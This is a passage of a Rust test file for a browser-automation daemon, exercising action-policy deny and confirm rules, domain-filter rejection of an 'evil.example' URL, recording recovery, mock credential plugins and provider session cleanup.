    let guard = EnvGuard::new(&["FROB_PROVIDER"]);
    guard.remove("FROB_PROVIDER");
    let cmd = json!({
        "action": "navigate",
        "id": "policy-plugin-1",
        "url": "https://example.com",
        "plugins": [
            {
                "name": "stealth",
                "command": "frob-plugin-stealth",
                "capabilities": ["launch.mutate"]
            }
        ]
    });

    let actions =
        policy_actions_for_command(&cmd, "navigate", true, None, None, &Running::from_env());

    assert_eq!(actions[0], "navigate");
    assert!(actions.contains(&"plugin:stealth:launch.mutate".to_string()));
}

#[test]
fn test_policy_actions_skip_auto_launch_mutators_when_browser_is_healthy() {
    let guard = EnvGuard::new(&["FROB_PROVIDER"]);
    guard.remove("FROB_PROVIDER");
    let cmd = json!({
        "action": "navigate",
        "id": "policy-plugin-healthy",
        "url": "https://example.com",
        "plugins": [
            {
                "name": "stealth",
                "command": "frob-plugin-stealth",
                "capabilities": ["launch.mutate"]
            }
        ]
    });

    let actions =
        policy_actions_for_command(&cmd, "navigate", false, None, None, &Running::from_env());

    assert_eq!(actions, vec!["navigate".to_string()]);
}

#[test]
fn test_a11y_url_policy_actions_include_navigation() {
    let with_url = json!({
        "action": "a11y",
        "id": "a11y-policy-url",
        "url": "https://example.com"
    });
    let current_page = json!({
        "action": "a11y",
        "id": "a11y-policy-current"
    });

    assert_eq!(
        policy_actions_for_command(&with_url, "a11y", false, None, None, &Running::from_env()),
        vec!["a11y".to_string(), "navigate".to_string()]
    );
    assert_eq!(
        policy_actions_for_command(
            &current_page,
            "a11y",
            false,
            None,
            None,
            &Running::from_env()
        ),
        vec!["a11y".to_string()]
    );
}

#[test]
fn test_policy_actions_use_command_plugins_for_provider_auto_launch() {
    let mut settings = Running::from_env();
    settings.set(Key::Provider, json!("browserbox"));
    let cmd = json!({
        "action": "navigate",
        "id": "policy-plugin-2",
        "url": "https://example.com",
        "plugins": [
            {
                "name": "browserbox",
                "command": "frob-plugin-browserbox",
                "capabilities": ["browser.provider"]
            },
            {
                "name": "stealth",
                "command": "frob-plugin-stealth",
                "capabilities": ["launch.mutate"]
            }
        ]
    });

    let actions = policy_actions_for_command(&cmd, "navigate", true, None, None, &settings);

    assert!(actions.contains(&"plugin:browserbox:browser.provider".to_string()));
    assert!(!actions.contains(&"plugin:stealth:launch.mutate".to_string()));
}

#[test]
fn test_policy_actions_follow_inherited_provider_attach() {
    let guard = EnvGuard::new(&["FROB_PROVIDER"]);
    guard.remove("FROB_PROVIDER");
    let plugins = json!([
        {
            "name": "browserbox",
            "command": "frob-plugin-browserbox",
            "capabilities": ["browser.provider"]
        },
        {
            "name": "stealth",
            "command": "frob-plugin-stealth",
            "capabilities": ["launch.mutate"]
        }
    ]);
    let attached = AttachedTarget::Provider("browserbox".to_string());
    let launch = json!({ "action": "launch", "headless": false, "plugins": plugins });
    let navigate =
        json!({ "action": "navigate", "url": "https://example.com", "plugins": plugins });

    for actions in [
        policy_actions_for_command(
            &launch,
            "launch",
            false,
            Some(&attached),
            None,
            &Running::from_env(),
        ),
        policy_actions_for_command(
            &navigate,
            "navigate",
            true,
            Some(&attached),
            None,
            &Running::from_env(),
        ),
    ] {
        assert!(actions.contains(&"plugin:browserbox:browser.provider".to_string()));
        assert!(!actions.contains(&"plugin:stealth:launch.mutate".to_string()));
    }
}

#[test]
fn test_policy_actions_use_resolved_provider_plugin_capability() {
    let guard = EnvGuard::new(&["FROB_PROVIDER"]);
    guard.set("FROB_PROVIDER", "browserbox");
    let cmd = json!({
        "action": "navigate",
        "id": "policy-plugin-duplicate-provider",
        "url": "https://example.com",
        "plugins": [
            {
                "name": "browserbox",
                "command": "global-browserbox",
                "capabilities": ["browser.provider"]
            },
            {
                "name": "browserbox",
                "command": "project-browserbox",
                "capabilities": ["command.run"]
            }
        ]
    });

    let actions =
        policy_actions_for_command(&cmd, "navigate", true, None, None, &Running::from_env());

    assert_eq!(actions, vec!["navigate".to_string()]);
}

#[test]
fn test_policy_actions_use_resolved_credential_plugin_capability() {
    let cmd = json!({
        "action": "auth_login",
        "id": "policy-plugin-duplicate-credential",
        "name": "example",
        "credentialProvider": "vault",
        "plugins": [
            {
                "name": "vault",
                "command": "global-vault",
                "capabilities": ["credential.read"]
            },
            {
                "name": "vault",
                "command": "project-vault",
                "capabilities": ["command.run"]
            }
        ]
    });

    let actions =
        policy_actions_for_command(&cmd, "auth_login", false, None, None, &Running::from_env());

    assert_eq!(actions, vec!["auth_login".to_string()]);
}

#[tokio::test]
async fn test_policy_denies_plugin_action_before_base_confirmation() {
    let guard = EnvGuard::new(&["FROB_PROVIDER"]);
    guard.remove("FROB_PROVIDER");
    let dir = tempfile::tempdir().unwrap();
    let policy_path = dir.path().join("policy.json");
    fs::write(
        &policy_path,
        r#"{"confirm":["navigate"],"deny":["plugin:stealth:launch.mutate"]}"#,
    )
    .unwrap();

    let mut state = DaemonState::new();
    state.policy = Some(ActionPolicy::load(policy_path.to_str().unwrap()).unwrap());
    let cmd = json!({
        "action": "navigate",
        "id": "policy-plugin-deny",
        "url": "https://example.com",
        "plugins": [
            {
                "name": "stealth",
                "command": "frob-plugin-stealth",
                "capabilities": ["launch.mutate"]
            }
        ]
    });

    let resp = execute_command(&cmd, &mut state).await;

    assert_eq!(resp["success"], false);
    assert!(resp["error"]
        .as_str()
        .unwrap()
        .contains("plugin:stealth:launch.mutate"));
    assert!(state.pending_confirmation.is_none());
}

#[tokio::test]
async fn test_policy_denies_read_before_fetch() {
    let dir = tempfile::tempdir().unwrap();
    let policy_path = dir.path().join("policy.json");
    fs::write(&policy_path, r#"{"deny":["read"]}"#).unwrap();

    let mut state = DaemonState::new();
    state.policy = Some(ActionPolicy::load(policy_path.to_str().unwrap()).unwrap());
    let cmd = json!({
        "action": "read",
        "id": "read-denied",
        "url": "https://example.com/docs"
    });

    let resp = execute_command(&cmd, &mut state).await;

    assert_eq!(resp["success"], false);
    assert!(resp["error"].as_str().unwrap().contains("read"));
    assert!(state.browser.is_none());
}

#[tokio::test]
async fn test_policy_denies_a11y_url_as_navigation_before_launch() {
    let dir = tempfile::tempdir().unwrap();
    let policy_path = dir.path().join("policy.json");
    fs::write(&policy_path, r#"{"deny":["navigate"]}"#).unwrap();

    let mut state = DaemonState::new();
    state.policy = Some(ActionPolicy::load(policy_path.to_str().unwrap()).unwrap());
    let cmd = json!({
        "action": "a11y",
        "id": "a11y-navigation-denied",
        "url": "https://example.com"
    });

    let resp = execute_command(&cmd, &mut state).await;

    assert_eq!(resp["success"], false);
    assert!(resp["error"].as_str().unwrap().contains("navigate"));
    assert!(state.browser.is_none());
}

#[tokio::test]
async fn test_restore_config_is_not_applied_before_confirmation() {
    let dir = tempfile::tempdir().unwrap();
    let policy_path = dir.path().join("policy.json");
    fs::write(&policy_path, r#"{"confirm":["navigate"]}"#).unwrap();

    let mut state = DaemonState::new();
    state.policy = Some(ActionPolicy::load(policy_path.to_str().unwrap()).unwrap());
    state.session_name = Some("old-key".to_string());
    state.restore_status = "loaded".to_string();

    let cmd = json!({
        "action": "navigate",
        "id": "restore-confirm",
        "url": "https://example.com",
        "restoreKey": "new-key"
    });

    let resp = execute_command(&cmd, &mut state).await;

    assert_eq!(resp["success"], true);
    assert_eq!(resp["data"]["confirmation_required"], true);
    assert_eq!(state.session_name.as_deref(), Some("old-key"));
    assert_eq!(state.restore_status, "loaded");
}

#[tokio::test]
async fn test_read_with_url_uses_session_domain_filter_before_fetch() {
    let mut state = DaemonState::new();
    {
        let mut df = state.domain_filter.write().await;
        *df = Some(DomainFilter::new("example.com"));
    }
    let cmd = json!({
        "action": "read",
        "id": "read-url-denied",
        "url": "https://evil.example/private"
    });

    let resp = execute_command(&cmd, &mut state).await;

    assert_eq!(resp["success"], false);
    let error = resp["error"].as_str().unwrap();
    assert!(error.contains("evil.example"));
    assert!(error.contains("allowed domains"));
    assert!(state.browser.is_none());
}

#[tokio::test]
async fn test_rejected_navigation_preserves_webmcp_invocations() {
    let mut state = DaemonState::new();
    state
        .webmcp
        .insert(webmcp::InvocationRecord::pending(
            "pending-1".to_string(),
            "pending-tool".to_string(),
            "frame-1".to_string(),
            "https://example.com".to_string(),
        ))
        .unwrap();
    {
        let mut df = state.domain_filter.write().await;
        *df = Some(DomainFilter::new("example.com"));
    }

    let error = handle_navigate(
        &json!({
            "action": "navigate",
            "url": "https://evil.example/private"
        }),
        &mut state,
    )
    .await
    .unwrap_err();

    assert!(error.contains("evil.example"));
    assert_eq!(state.webmcp.invocations["pending-1"].status, "pending");
}

#[tokio::test]
async fn test_read_with_url_cannot_broaden_session_domain_filter() {
    let mut state = DaemonState::new();
    {
        let mut df = state.domain_filter.write().await;
        *df = Some(DomainFilter::new("example.com"));
    }
    let cmd = json!({
        "action": "read",
        "id": "read-url-denied",
        "url": "https://evil.example/private",
        "allowedDomains": ["evil.example"]
    });

    let resp = execute_command(&cmd, &mut state).await;

    assert_eq!(resp["success"], false);
    let error = resp["error"].as_str().unwrap();
    assert!(error.contains("evil.example"));
    assert!(error.contains("allowed domains"));
    assert!(state.browser.is_none());
}

#[tokio::test]
async fn test_read_without_url_does_not_auto_launch() {
    let mut state = DaemonState::new();
    let cmd = json!({ "action": "read", "id": "read-active-tab" });

    let resp = execute_command(&cmd, &mut state).await;

    assert_eq!(resp["success"], false);
    assert!(resp["error"]
        .as_str()
        .unwrap()
        .contains("Browser not launched"));
    assert!(state.browser.is_none());
}

#[tokio::test]
async fn test_recording_start_rejects_disallowed_url_before_browser() {
    let mut state = DaemonState::new();
    {
        let mut df = state.domain_filter.write().await;
        *df = Some(DomainFilter::new("example.com"));
    }

    let error = handle_recording_start(
        &json!({
            "action": "recording_start",
            "id": "record-denied",
            "path": "/tmp/frob-denied.webm",
            "url": "https://evil.example/private"
        }),
        &mut state,
    )
    .await
    .unwrap_err();

    assert!(error.contains("evil.example"), "got: {}", error);
    assert!(error.contains("allowed domains"), "got: {}", error);
    assert!(state.browser.is_none());
    assert!(!state.recording_state.active);
}

#[tokio::test]
async fn test_recording_restart_rejects_disallowed_url_before_state_changes() {
    let mut state = DaemonState::new();
    {
        let mut df = state.domain_filter.write().await;
        *df = Some(DomainFilter::new("example.com"));
    }
    state.recording_state.active = true;
    state.recording_state.output_path = "/tmp/current.webm".to_string();

    let error = handle_recording_restart(
        &json!({
            "action": "recording_restart",
            "id": "record-restart-denied",
            "path": "/tmp/next.webm",
            "url": "https://evil.example/private"
        }),
        &mut state,
    )
    .await
    .unwrap_err();

    assert!(error.contains("evil.example"), "got: {}", error);
    assert!(error.contains("allowed domains"), "got: {}", error);
    assert!(state.recording_state.active);
    assert_eq!(state.recording_state.output_path, "/tmp/current.webm");
}

/// A browser-side attachment failure happens before ffmpeg opens the
/// destination, so an existing recording must remain untouched.
#[tokio::test]
#[ignore]
async fn e2e_recording_attach_failure_preserves_existing_output() {
    let dir = tempfile::tempdir().unwrap();
    let output_path = dir.path().join("existing.webm");
    fs::write(&output_path, b"existing recording").unwrap();

    let mut state = DaemonState::new();
    handle_launch(&json!({ "action": "launch", "headless": true }), &mut state)
        .await
        .expect("browser should launch");

    recording::recording_start(
        &mut state.recording_state,
        output_path.to_str().unwrap(),
        recording::RecordingOptions::default(),
    )
    .unwrap();
    let client = state.browser.as_ref().unwrap().client.clone();
    let error = state
        .start_recording_task(client, "invalid-recording-session".to_string())
        .await
        .expect_err("invalid session should fail attachment");
    let contents_after_failure = fs::read(&output_path);

    let _ = close_current_browser(&mut state).await;

    assert!(error.to_ascii_lowercase().contains("session"), "{error}");
    assert_eq!(
        contents_after_failure.unwrap(),
        b"existing recording",
        "a failed start must preserve the previous destination"
    );
}

/// A failed ffmpeg preflight preserves both the active recording and the
/// status published to stream and dashboard clients.
#[tokio::test]
#[ignore]
async fn e2e_recording_failed_restart_preserves_active_recording() {
    use futures_util::StreamExt;
    use tokio_tungstenite::tungstenite::Message;

    let guard = EnvGuard::new(&["PATH", "FROB_SOCKET_DIR", "FROB_SESSION"]);
    let original_path = std::env::var("PATH").unwrap_or_default();
    let socket_dir = tempfile::tempdir().unwrap();
    let empty_path = tempfile::tempdir().unwrap();
    guard.set("FROB_SOCKET_DIR", socket_dir.path().to_str().unwrap());
    guard.set("FROB_SESSION", "failed-record-restart");

    let mut state = DaemonState::new();
    handle_launch(&json!({ "action": "launch", "headless": true }), &mut state)
        .await
        .expect("browser should launch");
    let status = handle_stream_enable(&json!({ "port": 0 }), &mut state)
        .await
        .expect("stream should start");
    let port = status["port"].as_u64().unwrap() as u16;
    let previous_path = socket_dir.path().join("previous.webm");
    handle_recording_start(
        &json!({
            "action": "recording_start",
            "path": previous_path.to_string_lossy()
        }),
        &mut state,
    )
    .await
    .expect("initial recording should start");
    tokio::time::sleep(std::time::Duration::from_millis(300)).await;

    let restarted_path = socket_dir.path().join("restarted.webm");
    guard.set("PATH", empty_path.path().to_str().unwrap());
    let error = handle_recording_restart(
        &json!({
            "action": "recording_restart",
            "path": restarted_path.to_string_lossy()
        }),
        &mut state,
    )
    .await;
    let error = error.expect_err("restart should fail without ffmpeg");
    let active_after_failure = state.recording_state.active;

    let (mut ws, _) = tokio_tungstenite::connect_async(format!("ws://127.0.0.1:{port}"))
        .await
        .expect("stream client should connect");
    let reported_recording = loop {
        let message = tokio::time::timeout(std::time::Duration::from_secs(5), ws.next())
            .await
            .expect("status should arrive")
            .expect("stream should stay open")
            .expect("status should be readable");
        if let Message::Text(text) = message {
            let value: Value = serde_json::from_str(&text).unwrap();
            if value["type"] == "status" {
                break value["recording"].as_bool().unwrap();
            }
        }
    };

    guard.set("PATH", &original_path);
    let stop = handle_recording_stop(&mut state)
        .await
        .expect("preserved recording should still stop normally");
    let _ = ws.close(None).await;
    let _ = handle_stream_disable(&mut state).await;
    let _ = close_current_browser(&mut state).await;
    let _ = fs::remove_file(previous_path);

    assert!(error.contains("ffmpeg"), "{error}");
    assert!(
        active_after_failure,
        "failed replacement must leave the current recording active"
    );
    assert!(
        reported_recording,
        "stream clients must still see the preserved recording"
    );
    assert!(
        stop["frames"].as_u64().unwrap_or(0) > 0,
        "preserved recording should keep capturing frames"
    );
    assert!(
        !restarted_path.exists(),
        "failed preflight must not create the replacement output"
    );
}

#[tokio::test]
async fn test_read_without_url_blocks_disallowed_active_tab_before_content() {
    let (port, server) = start_webdriver_response_server(vec![(
        "/session/test-session/url",
        json!({ "value": "https://evil.example/private" }),
    )])
    .await;
    let mut state = DaemonState::new();
    state.backend_type = BackendType::WebDriver;
    state.webdriver_backend = Some(WebDriverBackend::new(
        crate::native::webdriver::client::WebDriverClient::new_with_session(
            port,
            "test-session".to_string(),
        ),
    ));
    let cmd = json!({
        "action": "read",
        "id": "read-active-tab-denied",
        "allowedDomains": ["example.com"]
    });

    let resp = execute_command(&cmd, &mut state).await;

    assert_eq!(resp["success"], false);
    let error = resp["error"].as_str().unwrap();
    assert!(error.contains("evil.example"));
    assert!(error.contains("allowed domains"));
    assert_eq!(server.await.unwrap(), 1);
}

#[tokio::test]
async fn test_read_without_url_uses_session_domain_filter_before_content() {
    let (port, server) = start_webdriver_response_server(vec![(
        "/session/test-session/url",
        json!({ "value": "https://evil.example/private" }),
    )])
    .await;
    let mut state = DaemonState::new();
    {
        let mut df = state.domain_filter.write().await;
        *df = Some(DomainFilter::new("example.com"));
    }
    state.backend_type = BackendType::WebDriver;
    state.webdriver_backend = Some(WebDriverBackend::new(
        crate::native::webdriver::client::WebDriverClient::new_with_session(
            port,
            "test-session".to_string(),
        ),
    ));
    let cmd = json!({
        "action": "read",
        "id": "read-active-tab-denied"
    });

    let resp = execute_command(&cmd, &mut state).await;

    assert_eq!(resp["success"], false);
    let error = resp["error"].as_str().unwrap();
    assert!(error.contains("evil.example"));
    assert!(error.contains("allowed domains"));
    assert_eq!(server.await.unwrap(), 1);
}

#[tokio::test]
async fn test_read_without_url_allows_matching_active_tab() {
    let (port, server) = start_webdriver_response_server(vec![
        (
            "/session/test-session/url",
            json!({ "value": "https://example.com/app" }),
        ),
        (
            "/session/test-session/source",
            json!({ "value": "<html><body><h1>Account</h1><p>Signed in.</p></body></html>" }),
        ),
    ])
    .await;
    let mut state = DaemonState::new();
    state.backend_type = BackendType::WebDriver;
    state.webdriver_backend = Some(WebDriverBackend::new(
        crate::native::webdriver::client::WebDriverClient::new_with_session(
            port,
            "test-session".to_string(),
        ),
    ));
    let cmd = json!({
        "action": "read",
        "id": "read-active-tab-allowed",
        "allowedDomains": ["example.com"]
    });

    let resp = execute_command(&cmd, &mut state).await;

    assert_eq!(resp["success"], true);
    assert_eq!(resp["data"]["source"], "active-tab-html");
    let content = resp["data"]["content"].as_str().unwrap();
    assert!(content.contains("# Account"));
    assert!(content.contains("Signed in."));
    assert_eq!(server.await.unwrap(), 2);
}

#[tokio::test]
async fn test_a_policy_change_drops_the_pending_confirmation() {
    let dir = tempfile::tempdir().unwrap();
    let confirm_read = dir.path().join("a.json");
    let deny_read = dir.path().join("b.json");
    fs::write(&confirm_read, r#"{"confirm":["read"]}"#).unwrap();
    fs::write(&deny_read, r#"{"deny":["read"]}"#).unwrap();
    let mut state = DaemonState::new();

    let parked = execute_command(
        &json!({
            "id": "parked",
            "action": "read",
            "url": "http://127.0.0.1:9/",
            "settings": { "action-policy": confirm_read.to_str().unwrap() }
        }),
        &mut state,
    )
    .await;
    assert_eq!(parked["data"]["confirmation_required"], true);
    assert!(state.pending_confirmation.is_some());

    // The operator switches to the stricter policy, riding on any command.
    let switched = execute_command(
        &json!({
            "id": "switch",
            "action": "state_list",
            "settings": { "action-policy": deny_read.to_str().unwrap() }
        }),
        &mut state,
    )
    .await;
    assert_eq!(switched["success"], true);
    assert!(state.pending_confirmation.is_none());

    let confirmed =
        execute_command(&json!({ "id": "confirm", "action": "confirm" }), &mut state).await;
    assert_eq!(confirmed["success"], false);
    assert!(state.policy.is_some());
    assert_eq!(
        state.settings.security().action_policy_path.as_deref(),
        deny_read.to_str()
    );
}

#[test]
fn test_a_confirmation_replay_drops_only_the_policy_settings() {
    let replay = confirmation_replay_command(&json!({
        "action": "launch",
        "allowedDomains": ["a.example"],
        "settings": {
            "action-policy": "/tmp/a.json",
            "confirm-actions": "read",
            "allowed-domains": ["a.example"],
            "profile": "/tmp/p",
            "relaunch": true
        }
    }));
    assert_eq!(replay["allowedDomains"], json!(["a.example"]));
    assert_eq!(
        replay["settings"],
        json!({ "allowed-domains": ["a.example"], "profile": "/tmp/p", "relaunch": true })
    );

    let only_security = confirmation_replay_command(&json!({
        "action": "read",
        "settings": { "action-policy": "/tmp/a.json" }
    }));
    assert!(only_security.get("settings").is_none());
}

#[tokio::test]
async fn test_a_confirmed_launch_keeps_the_allowed_domains_it_was_parked_with() {
    let (_env, mut state) = isolated_state();
    let dir = tempfile::tempdir().unwrap();
    let policy = dir.path().join("policy.json");
    fs::write(&policy, r#"{"confirm":["navigate"]}"#).unwrap();

    let parked = execute_command(
        &json!({
            "id": "parked",
            "action": "navigate",
            "url": "https://a.example",
            "settings": {
                "action-policy": policy.to_str().unwrap(),
                "allowed-domains": ["a.example"],
                "executable-path": "/missing/chrome-for-test"
            }
        }),
        &mut state,
    )
    .await;
    assert_eq!(parked["data"]["confirmation_required"], true);
    assert!(
        state.domain_filter.read().await.is_none(),
        "deferred to the launch"
    );

    // The launch fails (no browser binary) after the settings apply.
    let _ = execute_command(&json!({ "id": "c", "action": "confirm" }), &mut state).await;

    assert_eq!(
        state.settings.security().allowed_domains,
        Some(vec!["a.example".to_string()])
    );
    assert!(state.domain_filter.read().await.is_some());
}

#[tokio::test]
async fn test_confirm_rechecks_unapproved_plugin_action() {
    let guard = EnvGuard::new(&["FROB_PROVIDER"]);
    guard.remove("FROB_PROVIDER");
    let dir = tempfile::tempdir().unwrap();
    let policy_path = dir.path().join("policy.json");
    fs::write(
        &policy_path,
        r#"{"confirm":["navigate","plugin:stealth:launch.mutate"]}"#,
    )
    .unwrap();

    let mut state = DaemonState::new();
    state.policy = Some(ActionPolicy::load(policy_path.to_str().unwrap()).unwrap());
    let cmd = json!({
        "action": "navigate",
        "id": "policy-plugin-confirm",
        "url": "https://example.com",
        "plugins": [
            {
                "name": "stealth",
                "command": "frob-plugin-stealth",
                "capabilities": ["launch.mutate"]
            }
        ]
    });

    let first = execute_command(&cmd, &mut state).await;
    assert_eq!(first["data"]["confirmation_required"], true);
    assert_eq!(first["data"]["action"], "navigate");

    let second = execute_command(
        &json!({ "id": "policy-plugin-confirm-2", "action": "confirm" }),
        &mut state,
    )
    .await;

    assert_eq!(second["success"], true);
    assert_eq!(
        second["data"]["result"]["data"]["confirmation_required"],
        true
    );
    assert_eq!(
        second["data"]["result"]["data"]["action"],
        "plugin:stealth:launch.mutate"
    );
    let pending = state.pending_confirmation.as_ref().unwrap();
    assert_eq!(pending.action, "plugin:stealth:launch.mutate");
    assert!(pending.approved_actions.iter().any(|a| a == "navigate"));
}

#[cfg(unix)]
#[tokio::test]
async fn test_auth_login_does_not_resolve_plugin_without_browser() {
    use std::os::unix::fs::PermissionsExt;

    let dir = tempfile::tempdir().unwrap();
    let marker_path = dir.path().join("credential-plugin-invoked");
    let plugin_path = dir.path().join("mock-credential-plugin");
    fs::write(
            &plugin_path,
            r#"#!/bin/sh
printf invoked > "$1"
cat >/dev/null
printf '%s' '{"protocol":"frob.plugin.v1","success":true,"credential":{"username":"user","password":"pass","url":"https://example.com/login"}}'
"#,
        )
        .unwrap();
    let mut perms = fs::metadata(&plugin_path).unwrap().permissions();
    perms.set_mode(0o755);
    fs::set_permissions(&plugin_path, perms).unwrap();

    let mut state = DaemonState::new();
    let cmd = json!({
        "id": "auth-plugin-no-browser",
        "action": "auth_login",
        "name": "example",
        "credentialProvider": "mock",
        "plugins": [
            {
                "name": "mock",
                "command": plugin_path.to_string_lossy(),
                "args": [marker_path.to_string_lossy()],
                "capabilities": ["credential.read"]
            }
        ]
    });

    let err = handle_auth_login(&cmd, &mut state).await.unwrap_err();

    assert_eq!(err, "Browser not launched");
    assert!(!marker_path.exists());
}

#[cfg(unix)]
#[tokio::test]
async fn test_auth_login_no_navigate_rejects_missing_page_before_plugin_resolution() {
    use std::os::unix::fs::PermissionsExt;

    let dir = tempfile::tempdir().unwrap();
    let marker_path = dir.path().join("credential-plugin-invoked");
    let plugin_path = dir.path().join("mock-credential-plugin");
    fs::write(
            &plugin_path,
            r#"#!/bin/sh
printf invoked > "$1"
cat >/dev/null
printf '%s' '{"protocol":"frob.plugin.v1","success":true,"credential":{"username":"user","password":"pass","url":"https://example.com/login"}}'
"#,
        )
        .unwrap();
    let mut perms = fs::metadata(&plugin_path).unwrap().permissions();
    perms.set_mode(0o755);
    fs::set_permissions(&plugin_path, perms).unwrap();

    let mut state = DaemonState::new();
    let cmd = json!({
        "id": "auth-plugin-no-page",
        "action": "auth_login",
        "name": "example",
        "noNavigate": true,
        "credentialProvider": "mock",
        "plugins": [
            {
                "name": "mock",
                "command": plugin_path.to_string_lossy(),
                "args": [marker_path.to_string_lossy()],
                "capabilities": ["credential.read"]
            }
        ]
    });

    let err = handle_auth_login(&cmd, &mut state).await.unwrap_err();

    assert_eq!(err, AUTH_LOGIN_NO_NAVIGATE_PAGE_ERROR);
    assert!(!marker_path.exists());
}

#[cfg(unix)]
#[tokio::test]
async fn test_close_current_browser_closes_active_provider_plugin_session() {
    use std::os::unix::fs::PermissionsExt;

    let dir = tempfile::tempdir().unwrap();
    let request_path = dir.path().join("browser-close-request.json");
    let plugin_path = dir.path().join("mock-provider-plugin");
    fs::write(
        &plugin_path,
        r#"#!/bin/sh
cat > "$1"
printf '%s' '{"protocol":"frob.plugin.v1","success":true,"data":{}}'
"#,
    )
    .unwrap();
    let mut perms = fs::metadata(&plugin_path).unwrap().permissions();
    perms.set_mode(0o755);
    fs::set_permissions(&plugin_path, perms).unwrap();

    let mut state = DaemonState::new();
    state.active_provider_connection = true;
    state.active_provider_session = Some(ActiveProviderSession {
        session: providers::ProviderSession {
            provider: "plugin:cloud-browser".to_string(),
            session_id: r#"{"sessionId":"s1"}"#.to_string(),
        },
        plugins: vec![crate::plugins::PluginConfig {
            name: "cloud-browser".to_string(),
            command: plugin_path.to_string_lossy().to_string(),
            args: vec![request_path.to_string_lossy().to_string()],
            capabilities: vec![crate::plugins::CAPABILITY_BROWSER_PROVIDER.to_string()],
            ..crate::plugins::PluginConfig::default()
        }],
    });

    close_current_browser(&mut state).await.unwrap();

    assert!(state.active_provider_session.is_none());
    assert!(!state.active_provider_connection);
    let request = fs::read_to_string(request_path).unwrap();
    assert!(request.contains(r#""type":"browser.close""#));
    assert!(request.contains(r#""sessionId":"s1""#));
}

fn pending_browser_use_session() -> ActiveProviderSession {
    ActiveProviderSession {
        session: providers::ProviderSession {
            provider: "browser-use".to_string(),
            session_id: "0e6ae5d0-93cf-4b9c-8c62-2c9c07b6c0f7".to_string(),
        },
        plugins: Vec::new(),
    }
}

#[tokio::test]
async fn test_browser_use_failed_launches_restore_configuration() {
    let guard = EnvGuard::new(&[
        "BROWSER_USE_API_KEY",
        "FROB_PROVIDER",
        "FROB_PROXY_USERNAME",
        "FROB_PROXY_PASSWORD",
    ]);
    guard.remove("BROWSER_USE_API_KEY");
    guard.remove("FROB_PROVIDER");
    guard.set("FROB_PROXY_USERNAME", "new-user");
    guard.set("FROB_PROXY_PASSWORD", "new-password");
    for explicit in [true, false] {
        let mut state = DaemonState::new();
        state.settings.set(Key::Provider, json!("browser-use"));
        let credentials = Some(("old-user".to_string(), "old-password".to_string()));
        *state.domain_filter.write().await = Some(DomainFilter::new("example.com"));
        *state.proxy_credentials.write().await = credentials.clone();
        state.plugin_init_scripts = vec!["previous-script".to_string()];
        state.session_setup.user_agent = Some("previous-agent".to_string());
        let result = if explicit {
            handle_launch(
                &json!({"provider":"browser-use", "allowedDomains":[]}),
                &mut state,
            )
            .await
        } else {
            auto_launch(&mut state, Vec::new()).await
        };
        assert!(result.is_err());
        assert_eq!(current_allowed_domains(&state).await, vec!["example.com"]);
        assert_eq!(*state.proxy_credentials.read().await, credentials);
        assert_eq!(state.plugin_init_scripts, vec!["previous-script"]);
        assert_eq!(
            state.session_setup.user_agent.as_deref(),
            Some("previous-agent")
        );
    }
}

#[test]
fn test_browser_use_canceled_setup_and_stop_preserve_state() {
    use std::io::Read;
    let vars = [
        "BROWSER_USE_API_KEY",
        "HTTPS_PROXY",
        "https_proxy",
        "ALL_PROXY",
        "all_proxy",
        "NO_PROXY",
        "no_proxy",
    ];
    let guard = EnvGuard::new(&vars);
    for name in vars {
        guard.remove(name);
    }
    guard.set("BROWSER_USE_API_KEY", "test-key");
    let rt = tokio::runtime::Runtime::new().unwrap();
    for closing in [false, true] {
        let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
        guard.set(
            "HTTPS_PROXY",
            &format!("http://{}", listener.local_addr().unwrap()),
        );
        let server = std::thread::spawn(move || {
            let (mut stream, _) = listener.accept().unwrap();
            stream
                .set_read_timeout(Some(std::time::Duration::from_secs(2)))
                .unwrap();
            let mut bytes = [0; 1024];
            let count = stream.read(&mut bytes).unwrap();
            assert!(std::str::from_utf8(&bytes[..count])
                .unwrap()
                .starts_with("CONNECT "));
            std::thread::sleep(std::time::Duration::from_millis(700));
        });
        rt.block_on(async {
            let mut state = DaemonState::new();
            state.session_setup.user_agent = Some("previous-agent".to_string());
            *state.domain_filter.write().await = Some(DomainFilter::new("example.com"));
            let deadline = std::time::Duration::from_millis(200);
            if closing {
                state.active_provider_session = Some(pending_browser_use_session());
                state.active_provider_connection = true;
                state.launch_identity = Some(42);
                state.screencasting = true;
                state.network_auto_attach_installed = true;
                assert!(
                    tokio::time::timeout(deadline, close_current_browser(&mut state))
                        .await
                        .is_err()
                );
                assert_eq!(
                    state
                        .active_provider_session
                        .as_ref()
                        .unwrap()
                        .session
                        .session_id,
                    pending_browser_use_session().session.session_id
                );
                assert!(state.active_provider_connection);
                assert_eq!(state.launch_identity, None);
                assert!(!state.screencasting && !state.network_auto_attach_installed);
            } else {
                let result = handle_launch_with_deadline(
                    &json!({"provider":"browser-use", "allowedDomains":[]}),
                    &mut state,
                    deadline,
                )
                .await;
                assert!(result.unwrap_err().contains("setup timed out"));
            }
            assert_eq!(
                state.session_setup.user_agent.as_deref(),
                Some("previous-agent")
            );
            assert_eq!(current_allowed_domains(&state).await, vec!["example.com"]);
        });
        server.join().unwrap();
    }
}

#[tokio::test]
async fn test_browser_use_cdp_failure_retains_ownership_without_exposing_credentials() {
    for endpoint in [
        "",
        "file:///secret",
        "ws://127.0.0.1:1/secret?apiKey=do-not-echo",
    ] {
        let mut state = DaemonState::new();
        let session = pending_browser_use_session().session;
        let conn = providers::ProviderConnection {
            ws_url: endpoint.to_string(),
            session: Some(session.clone()),
            direct_page: false,
            metadata: None,
        };
        let error = attach_provider_cdp("browser-use", &conn, None, &mut state, &[])
            .await
            .err()
            .unwrap();
        assert!(error.starts_with("Browser Use"));
        assert!(!error.contains("secret") && !error.contains("do-not-echo"));
        let active = state.active_provider_session.as_ref().unwrap();
        assert_eq!(active.session.session_id, session.session_id);
    }
}

#[tokio::test]
async fn test_browser_use_failed_close_retains_id_and_blocks_replacement() {
    let guard = EnvGuard::new(&["BROWSER_USE_API_KEY", "FROB_PROVIDER"]);
    guard.remove("BROWSER_USE_API_KEY");
    guard.remove("FROB_PROVIDER");
    let mut state = DaemonState::new();
    state.active_provider_connection = true;
    state.active_provider_session = Some(pending_browser_use_session());
    for action in ["close", "close", "launch"] {
        let response = execute_command(&json!({"action":action,"id":"retry"}), &mut state).await;
        assert_eq!(response["success"], false);
        assert!(response["error"]
            .as_str()
            .unwrap()
            .contains(&pending_browser_use_session().session.session_id));
        assert_eq!(
            state
                .active_provider_session
                .as_ref()
                .unwrap()
                .session
                .session_id,
